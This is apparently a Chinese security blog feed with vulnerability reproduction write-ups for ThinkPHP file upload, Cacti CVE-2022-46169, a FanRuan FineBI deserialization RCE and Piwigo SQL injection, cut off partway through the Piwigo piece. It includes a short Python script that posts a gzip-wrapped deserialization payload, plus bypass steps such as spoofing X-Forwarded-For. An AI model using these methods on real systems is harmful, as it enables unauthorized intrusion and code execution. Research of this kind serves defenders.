<code>$extension</code> ，下面是一个判断，图片后缀为这个数组里面的值并且后面也为 <code>true</code> 时就会返回错误，这里的条件很奇葩，当我们的文件后缀为 <code>php</code> 时就不满足第一个条件，直接返回 <code>true</code> </p><p><code>chechPath</code> 方法</p><p><img src="image-20221210231636945.png" alt="image-20221210231636945"></p><p>这里只是判断有没有相应文件夹，没有就创建，因此也可以过</p><p>接下来看看 <code>move</code> 方法的下半部分</p><p><img src="image-20221210231747613.png" alt="image-20221210231747613"></p><p>这里并没有其他的检测了，直接将临时文件移动到了目标文件。</p><p>我们直接上传一个 <code>php</code> 文件，即可在使用官方示例的条件下 <code>getshell</code></p><h2 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h2><p>由于官方示例没有上传的模板，因此我们自己创建一个</p><p><img src="image-20221210232333208.png" alt="image-20221210232333208"></p><p>上传并且抓包，将后面改为 <code>php</code>，如图</p><p><img src="image-20221210232409533.png" alt="image-20221210232409533"></p><p><img src="image-20221210232527073.png" alt="image-20221210232527073"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这个漏洞是属于<code>thinkphp</code>框架的函数的漏洞，因此需要开发者按照官方示例去使用或者类似的用法才会造成 <code>getshell</code> 。</p><p>但是也会觉得很奇葩，因为此处的实际检测应该就是那处 <code>checkImg</code> 方法，但他这里明显就写错，必须属于图片类型才会返回 <code>false</code> ，根本上就没有对危险的后缀进行过滤，更让人觉得离谱的是，至少从 <code>5.0.0</code> 开始一直到最新版本，都是这样的，没有更改过。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/2058&quot;&gt;https://forum.butian.net/share/2058&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
    <category term="ThinkPHP" scheme="https://d5shenwu.github.io/tags/ThinkPHP/"/>
    
    <category term="文件上传漏洞" scheme="https://d5shenwu.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="getshell" scheme="https://d5shenwu.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>Cacti_1.2.22_前台RCE_CVE-2022-46169</title>
    <link href="https://d5shenwu.github.io/2022/12/07/Cacti-1-2-22-%E5%89%8D%E5%8F%B0RCE-CVE-2022-46169/"/>
    <id>https://d5shenwu.github.io/2022/12/07/Cacti-1-2-22-%E5%89%8D%E5%8F%B0RCE-CVE-2022-46169/</id>
    <published>2022-12-07T13:45:23.000Z</published>
    <updated>2023-03-15T15:02:38.995Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/2057">https://forum.butian.net/share/2057</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>2022年12月，奇安信 <code>CERT</code> 发布了一则漏洞通告，<code>Cacti</code> （基于 <code>Web</code> 的开源网络监视和绘图工具）存在命令执行漏洞 <code>CVE-2022-46169</code> ，攻击者可通过构造恶意请求在无需登录的情况下向函数中注入命令，达到命令执行的目的，该漏洞影响范围很大，建议升级到最新无漏洞版本。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>cacti &lt; 1.2.23</code></p><h2 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h2><p>该系统为开源系统，<code>github</code> 地址：<a href="https://github.com/Cacti/cacti">https://github.com/Cacti/cacti</a></p><p>直接选择 <code>1.2.22</code> <code>Release</code> 版本下载并进行安装，根目录下有一个 <code>cacti.sql</code> ，导入数据库，然后将 <code>include/config.php.dist</code> 复制为 <code>include/config.php</code> ，并将数据库配置按自己的改好。</p><p>访问 <code>http://localhost/cacti/</code> 进行安装</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>漏洞分为两部分，登录绕过与命令注入</p><p><code>github</code> 有 <code>commit</code> 记录，可以帮我们快速找到漏洞点</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Cacti/</span>cacti<span class="hljs-regexp">/commit/</span><span class="hljs-number">7</span>f0e16312dd5ce20f93744ef8b9c3b0f1ece2216<br></code></pre></td></tr></table></figure><h3 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h3><p> <code>commit</code> 记录比较少，命令注入部分很容易看到位置，而大部分的修复全都跟 <code>get_client_addr</code> 这个函数有关，这个函数一看就知道与客户端 <code>IP</code> 有关。先简单看一下相关修复记录</p><p><img src="image-20221208205347932.png" alt="image-20221208205347932"></p><p>原本的代码是从 <code>Client-IP</code> 、<code>X-Forwarded-For</code> 等可以由用户控制的参数中获取值，而修改的代码则是限制了获取，不让从这些可控的参数中取值，因此可以猜测这个与登录绕过存在关系。</p><p>根据修复记录可以看到，命令注入的位置位于根目录的 <code>remote_agent.php</code> ，我们在这个文件刚好可以看到调用了上述说的 <code>get_client_addr</code> ，而这个文件是可以从 <code>web</code> 端进行访问的，大概的逻辑能看出来了，就是直接访问这个文件，通过输入的 <code>ip</code> 来绕过登录，最后导致命令执行，接下来看看这个文件的逻辑。</p><p>当我们直接访问 <code>/remote_agent.php</code> 可以来到如下的位置，前面加载的一堆 <code>php</code> 文件并没有阻挡我们，也就是前面不存在认真的地方</p><p><img src="image-20221208211723848.png" alt="image-20221208211723848"></p><p>看到箭头指向的位置，这里是一个 <code>()</code> 函数 ，返回为 <code>false</code> 时会返回没有认证的提示并退出，因此认证就是在这个位置，跟进看看</p><p><img src="image-20221208212042631.png" alt="image-20221208212042631"></p><p>前半部分如上，会进入 <code>get_client_addr</code> 也就是修复记录中的修复位置，返回 <code>false</code> 或者使用 <code>filter_var</code> 对 <code>client_addr</code> 进行判断，我们先跟进 <code>get_client_addr</code> 看看</p><p><img src="image-20221208212317680.png" alt="image-20221208212317680"></p><p>这里的代码在上面也讲过了，实际上就是从 <code>X-Forwarded-For</code>等可控的参数中获取值，<code>filter_var</code> 进行过滤，正确的地址就可以返回，我们可以通过设置 <code>X-Forwarded-For</code> 等对其进行控制</p><p>接下来看到 <code>remote_client_authorized</code> 函数的下半部分</p><p><img src="image-20221208212619207.png" alt="image-20221208212619207"></p><p>这里会使用 <code>gethostbyaddr</code> 对 <code>client_addr</code> 获取网络主机名，当 <code>$client_name</code> 与 <code>$client_addr</code> 不同时，进行 <code>remote_agent_strip_domain</code> 处理</p><p><img src="image-20221208212949597.png" alt="image-20221208212949597"></p><p>从上图可以看到，就是截取点号前面的值</p><p>然后从数据库中的 <code>poller</code> 表中获取所有的 <code>$pollers</code> ，取出其 <code>hostname</code> 跟我们的 <code>$client_name</code> 比较，我们可以看到默认安装后的数据表 <code>poller</code></p><p><img src="image-20221208213509308.png" alt="image-20221208213509308"></p><p>可以看到这里只有一个值，是 <code>localhost</code> ，那既然这样的话，大多数情况下，我们传进去的值为 <code>127.0.0.1</code> 时，就会返回 <code>true</code>  了</p><p>为什么说是大多数情况呢？</p><p>当我们的 <code>hosts</code> 中设置了域名解析到 <code>127.0.0.1</code> 时，<code>gethostbyaddr</code> 函数就会返回该域名，就像这样</p><p><img src="image-20221208214152534.png" alt="image-20221208214152534"></p><p>所有有时候测试时没有绕过去可以看看这个 <code>hosts</code> 文件是不是有其他定义</p><p>因此我们可以通过修改 <code>X-Forwarded-For</code> 来绕过这里的认证</p><p>注意：当服务器是 <code>linux</code> 时，<code>hosts</code> 默认有个 <code>localhost</code> 指向 <code>127.0.0.1</code> ，而 <code>windows</code> 作为服务器时，默认没有任何指向，我们的 <code>127.0.0.1</code> 经过 <code>gethostbyaddr</code> 后会得到 <code>windows</code> 的主机名，而不是 <code>localhost</code>， 这样的情况是没有绕过认证的，但也是可以绕过的，这里留给读者自己思考一下。</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p>继续对代码进行分析</p><p><img src="image-20221208220310361.png" alt="image-20221208220310361"></p><p>这里执行了一个 <code>set_default_action</code> 函数，跟进代码</p><p><img src="image-20221208220415380.png" alt="image-20221208220415380"></p><p>这里比较看懂，就是是否存在 <code>action</code> 参数，不存在就设置为 <code>$default</code> ，存在就对其进行赋值，这里是 <code>$_REQUEST</code> ，可以是 <code>post</code> 或者 <code>get</code></p><p>继续上面代码，这里是一个 <code>switch...case...</code> ，当我们的 <code>action</code> 是 <code>polldata</code> 时就可以进行修复 <code>commit</code> 中所提到的 <code>poll_for_data</code> 函数</p><p>我们先看一下 <code>poll_for_data</code> 修复记录</p><p><img src="image-20221208224607609.png" alt="image-20221208224607609"></p><p>修改的参数为 <code>$poller_id</code> ，由 <code>get_nfilter_request_var</code> 改为了 <code>get_filter_request_var</code> ，从名字可以看个大概，原本是没有过滤的，现在改为过滤了，我们看看 <code>get_nfilter_request_var</code> 函数内部</p><p><img src="image-20221208224920053.png" alt="image-20221208224920053"></p><p>这里是直接获取值，并不存在过滤，这使得我们的参数可控</p><p>第二处修复只是在第一处过滤的基础上又加了一层保险而已，没有太多需要关注的，接下来回到代码从第一处往下跟</p><p><img src="image-20221208225941071.png" alt="image-20221208225941071"></p><p>这里的 <code>$local_data_ids</code> 也是传进来的值，可控。</p><p>接下来我们关注这里的 <code>$items</code> ，是从数据库的 <code>poller_item</code> 表中取出来的，这个数据表的数据在接下来起到了关键作用，但是它在数据库中默认为空。</p><p>这个数据需要管理后台来创建（也许是我没有看到哪里可以由前台就得到？希望有大佬解答）</p><p>接下来当 <code>$items</code> 有了数据并且他的成员中有一个 <code>item</code> 也是一个数组并且键为 <code>action</code>，值为 <code>2</code> 时，即可进入命令注入的漏洞所在</p><p><img src="image-20221208231635933.png" alt="image-20221208231635933"></p><p>这里的 385 行就有一个 <code>proc_open</code> 可以命令执行。</p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><p>官方已经提供修复的版本，直接 <code>github</code> 下载即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/Cacti/</span>cacti<br></code></pre></td></tr></table></figure><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>最后一步，实现 <code>proc_open</code> 这里也存在一定的难度，实现命令执行部分就由读者们自己去探索吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文首发于奇安信攻防社区：&lt;a href=&quot;https://forum.butian.net/share/2057&quot;&gt;https://forum.butian.net/share/2057&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景</summary>
      
    
    
    
    <category term="PHP漏洞复现" scheme="https://d5shenwu.github.io/categories/PHP%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="PHP" scheme="https://d5shenwu.github.io/tags/PHP/"/>
    
    <category term="Cacti" scheme="https://d5shenwu.github.io/tags/Cacti/"/>
    
    <category term="未授权漏洞" scheme="https://d5shenwu.github.io/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="RCE" scheme="https://d5shenwu.github.io/tags/RCE/"/>
    
    <category term="CVE" scheme="https://d5shenwu.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>帆软反序列化RCE漏洞分析_V20220812</title>
    <link href="https://d5shenwu.github.io/2022/12/02/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-V20220812/"/>
    <id>https://d5shenwu.github.io/2022/12/02/%E5%B8%86%E8%BD%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-V20220812/</id>
    <published>2022-12-02T13:30:13.000Z</published>
    <updated>2023-12-15T14:35:58.477Z</updated>
    
    <content type="html"><![CDATA[<p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>朋友发给我一起看看的洞，我也搞 <code>JAVA</code> 的系统搞得少，一起看了下，成功复现，在这里记录一下。</p><h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>帆软官网通告： <a href="https://help.fanruan.com/finereport/doc-view-4833.html">https://help.fanruan.com/finereport/doc-view-4833.html</a></p><p><img src="image-20221202223722314.png" alt="image-20221202223722314"></p><h2 id="0x02-漏洞影响"><a href="#0x02-漏洞影响" class="headerlink" title="0x02 漏洞影响"></a>0x02 漏洞影响</h2><p>影响 2022-08-12 之前的 <code>FineReport10.0/11.0</code> 、<code>FineBI5.1</code> 系列</p><p>经测试 <code>FineBI5.1.10</code> 可以成功，<code>FineBI5.1.18</code> 无法成功，下载到的最新版 <code>FineReport10.0</code> 也无法成功，但历史版本应该可以成功。</p><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><h3 id="安装包下载"><a href="#安装包下载" class="headerlink" title="安装包下载"></a>安装包下载</h3><p>本文使用的环境是 <code>FineBI5.1.10</code></p><p>官网可以下载到安装包：<a href="https://www.finebi.com/product/download">https://www.finebi.com/product/download</a></p><p>注册一个账号即可获取免费注册码</p><h3 id="调试环境搭建"><a href="#调试环境搭建" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h3><p>安装完后，<code>IDEA</code> 直接打开整个项目，一股脑导入所有的 <code>jar</code> 包</p><p><img src="image-20221202224522686.png" alt="image-20221202224522686"></p><p>接下来设置调试选项</p><p><img src="image-20221202224606235.png" alt="image-20221202224606235"></p><p>复制红框中的参数，然后打开 <code>E:\FineBI5.1\bin\finebi.vmoptions</code> ，并将该参数插入到最后一行，重启 <code>FineBI.exe</code> ，<code>IDEA</code> 打开 <code>debug</code> 即可开始调试。</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>根据漏洞通告，直接找到 <code>webroot/decision/remote/design/channel</code> 接口所在的包，位置如下：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-decision-report<span class="hljs-number">-10.0</span>.jar!\com\fr\decision\extension\report\api\remote\RemoteDesignResource.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221202225134348.png" alt="image-20221202225134348"></p><p>此处将所有的输入都放入 <code>WorkContext.handleMessage</code> ，跟进后如下</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\workspace\WorkContext.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221202225214365.png" alt="image-20221202225214365"></p><p>继续跟进 <code>messageListener.handleMessage</code></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\workspace\engine\rpc\WorkspaceServerInvoker.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221202225305637.png" alt="image-20221202225305637"></p><p>这里就能看到与反序列化有关的 <code>this.deserializeInvocation</code> ，参数 <code>var1</code> 是我们的输入，<code>var2</code> 用来存放结果</p><p><img src="image-20221202225509633.png" alt="image-20221202225509633"></p><p>看到这一句</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">(Invocation)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SerializerHelper</span>.</span></span>deserialize(var1, <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">GZipSerializerWrapper</span>.</span></span>wrap(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvocationSerializer</span>.</span></span>get<span class="hljs-constructor">Default()</span>));<br></code></pre></td></tr></table></figure><p>这里涉及到三个类的处理，依次来看，我们首先看到 <code>InvocationSerializer.getDefault()</code></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\rpc\serialization\InvocationSerializer.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221203200838161.png" alt="image-20221203200838161"></p><p>这里直接返回 <code>DEFAULT</code> ，是在 23 行定义的常量，直接是获取实例化的 <code>InvocationSerializer()</code> ，可以直接看构造函数，最后执行的是 <code>SerializerSummaryAdaptor.get()</code>  </p><p>获取完后直接将得到的值或对象赋值给 <code>this.paramSerializer</code> ，但是这个变量在后面反序列化执行中并不涉及，因此就不细讲了。</p><p>因此我们此处获取的是 <code>InvocationSerializer()</code> 的实例化对象，之后传入 <code>GZipSerializerWrapper.wrap()</code> 进行封装，看代码</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\serialization\GZipSerializerWrapper.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221203202154227.png" alt="image-20221203202154227"></p><p>这里直接返回 <code>GZipSerializerWrapper(var0)</code> 实例化对象，然后是将传进来的 <code>var1</code> 也就是前面提到的 <code>InvocationSerializer()</code> 实例化对象赋值给 <code>this.serializer</code> </p><p>好了，接下来执行 <code>SerializerHelper.deserialize()</code></p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\serialization\SerializerHelper.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221203202616875.png" alt="image-20221203202616875"></p><p>这时候的 <code>var1</code> 已经处理过，不再是 <code>null</code> ，可以跳过 <code>if</code> 语句，然后使用 <code>ByteArrayInputStream</code> 将字节数组转换为输入流，最后进行反序列化，调用首先调用 <code>GZipSerializerWrapper</code> 的 <code>deserialize</code> 函数</p><p><img src="image-20221203203405870.png" alt="image-20221203203405870"></p><p>注意到这里的 <code>deserialize</code> 方法，反序列化时，会先将传入的值进行 <code>gzip</code> 解压，然后再反序列化，这点一定得牢记。</p><p>然后调用 <code>this.serializer</code> 的 <code>deserialize</code>，前面讲过 <code>this.serializer</code> 是实例化的 <code>InvocationSerializer()</code> ，因此调用 <code>InvocationSerializer()</code> 的 <code>deserialize</code> </p><p><img src="image-20221203203545080.png" alt="image-20221203203545080"></p><p>这里就调用了 <code>JDKSerializer.CustomObjectInputStream(var1)</code> ，看到代码</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineBI5<span class="hljs-number">.1</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\serialization\JDKSerializer.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221203203715576.png" alt="image-20221203203715576"></p><p>这个 <code>CustomObjectInputStream</code> 类继承了 <code>ObjectInputStream</code> ，最后调用 <code>readObject</code> 方法进行反序列化，由于内容可控，因此造成了反序列化漏洞。</p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>这里可以利用 <code>CB</code> 链的不使用 <code>common-connections</code>  版本进行攻击，直接借助 <code>su18</code> 大佬的 <code>ysuserial</code> 工具生成 <code>payload</code> ，选中的链子是 <code>CommonsBeanutils1183NOCC</code> </p><p>简单写个 <code>exp</code> 提交数据</p><p>这个 <code>exp</code> 参考的大佬的，链接在最下方有，在他的基础上，增加了 <code>gzip</code> 压缩，以及删除了 <code>headers</code> ，这个 <code>headers</code> 在此处可以使用，但是在 <code>FineBI5.1.18</code> 或者 <code>FineReport10.0.19</code> 会导致数据无法 <code>POST</code> 成功（这里让我调了挺久，最后通过 <code>wireshark</code> 抓包才查出来问题）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://127.0.0.1:37799/webroot/decision/remote/design/channel&quot;</span><br><br>filename = sys.argv[<span class="hljs-number">1</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    content = f.read()<br><br>data = gzip.compress(content)<br><br>res = requests.post(url, data=data, verify=<span class="hljs-literal">False</span>)<br><br><span class="hljs-built_in">print</span>(res.text)<br><br></code></pre></td></tr></table></figure><p><img src="image-20221203214347716.png" alt="image-20221203214347716"></p><h2 id="0x06-修复"><a href="#0x06-修复" class="headerlink" title="0x06 修复"></a>0x06 修复</h2><p><code>FineBI5.1.10</code> 成功后，我又去看了 <code>FineBI5.1.18</code> ，利用没有成功。我这里使用 <code>FineReport10.0</code> ，代码几乎一致</p><p><code>FineReport10.0</code> 的代码中存在这样一段，对反序列化的数据进行了黑名单过滤</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineReport_10<span class="hljs-number">.0</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\serialization\JDKSerializer.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p><img src="image-20221204124326906.png" alt="image-20221204124326906"></p><p>黑名单位置</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">FineReport_10<span class="hljs-number">.0</span>\webapps\webroot\WEB-INF\lib\fine-core<span class="hljs-number">-10.0</span>.jar!\com\fr\serialization\blacklist.txt<br></code></pre></td></tr></table></figure><h2 id="0x07-参考链接"><a href="#0x07-参考链接" class="headerlink" title="0x07 参考链接"></a>0x07 参考链接</h2><ul><li><a href="https://www.yang99.top/index.php/archives/93/">https://www.yang99.top/index.php/archives/93/</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。&lt;/p&gt;
&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="JAVA漏洞复现" scheme="https://d5shenwu.github.io/categories/JAVA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="RCE" scheme="https://d5shenwu.github.io/tags/RCE/"/>
    
    <category term="JAVA" scheme="https://d5shenwu.github.io/tags/JAVA/"/>
    
    <category term="帆软" scheme="https://d5shenwu.github.io/tags/%E5%B8%86%E8%BD%AF/"/>
    
    <category term="JAVA反序列化" scheme="https://d5shenwu.github.io/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Piwigo_12.2.0_两枚SQL注入_CVE</title>
    <link href="https://d5shenwu.github.io/2022/11/26/Piwigo-12-2-0-%E4%B8%A4%E6%9E%9ASQL%E6%B3%A8%E5%85%A5-CVE/"/>
    <id>https://d5shenwu.github.io/2022/11/26/Piwigo-12-2-0-%E4%B8%A4%E6%9E%9ASQL%E6%B3%A8%E5%85%A5-CVE/</id>
    <published>2022-11-26T12:20:32.000Z</published>
    <updated>2022-12-12T11:51:57.905Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/2030">https://forum.butian.net/share/2030</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>近期与朋友一起看的两个洞，<code>Piwigo</code> 的两枚 <code>SQL</code> 注入漏洞，二次注入的漏洞挺有意思的，在这里记录一下。</p><h2 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h2><p><code>Piwigo</code> 可以通过 <code>github</code> 或者其官网下载。</p><p><code>github</code> 地址：<a href="https://github.com/Piwigo/Piwigo">https://github.com/Piwigo/Piwigo</a></p><p>官网：<a href="https://piwigo.org/">https://piwigo.org/</a></p><h2 id="0x02-CVE-2022-26266"><a href="#0x02-CVE-2022-26266" class="headerlink" title="0x02 CVE-2022-26266"></a>0x02 CVE-2022-26266</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Piwigo</code> 在 12.2.0 版本的 <code>pwg.users.php</code> 文件中发现一枚<code>SQL</code> 注入漏洞，可通过该漏洞获取数据库中的数据。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>cve</code> 官方漏洞描述中已经点出漏洞文件为 <code>pwg.users.php</code> ，我们直接看到这里，位于 <code>include/ws_functions/pwg.users.php</code></p><p>这里很多数据库操作，而且很多都是在拼接，出现注入的概率确实挺大的。</p><p>这个文件全都是函数，也就是说我们无法直接访问到这里，因此现在需要做的是找到调用的位置</p><p>第一个函数是 <code>ws_users_getList</code> ，直接全局搜索该函数</p><p><img src="image-20221117221711630.png" alt="image-20221117221711630"></p><p>在这里的 <code>ws.php</code> 中，<code>ws_users_getList</code> 被 <code>addMethod</code> 添加到 <code>$service</code> 的 <code>method</code> 列表中，实际上这里是 <code>piwigo</code> 自身定义的访问模式，这里就不细讲了，大概就是将一些路由与函数绑定在一起，当出现访问时，通过回调的方式去访问。</p><p>要想访问 <code>ws_users_getList</code> ，我们只需要访问 <code>ws.php</code> ，并 <code>get</code> 一个 <code>method</code> 参数，值为 <code>pwg.users.getList</code> 即可。</p><p>我们再回来看这个 <code>ws_users_getList</code> 的内容</p><p><img src="image-20221117224118489.png" alt="image-20221117224118489"></p><p><code>$params</code> 中存放的是我们请求的值与系统默认的一些值，看到上图，当我们的输入中带有单引号等特殊字符时，会自动转义，这是系统对输入值的过滤，不允许直接输入单双引号等危险字符。如上很多的拼接字符串都使用不了，因为他们都需要闭合前面的引号，我们只能找可以直接拼接而不用闭合引号的参数。</p><p><code>order by</code> 是常用的突破点，我们直接找到此处 208 行，并在输入中输入 <code>order</code> 参数</p><p><img src="image-20221117224722221.png" alt="image-20221117224722221"></p><p>这里我们不用闭合单引号，因此可以直接对其进行注入</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>本漏洞需要登录后台利用，登录后如下点击</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">用户 -&gt; 管理 -&gt; 用户列表<br></code></pre></td></tr></table></figure><p><img src="image-20221117220404252.png" alt="image-20221117220404252"></p><p>抓包，但是放掉第一个包，进入第二个包如下</p><p><img 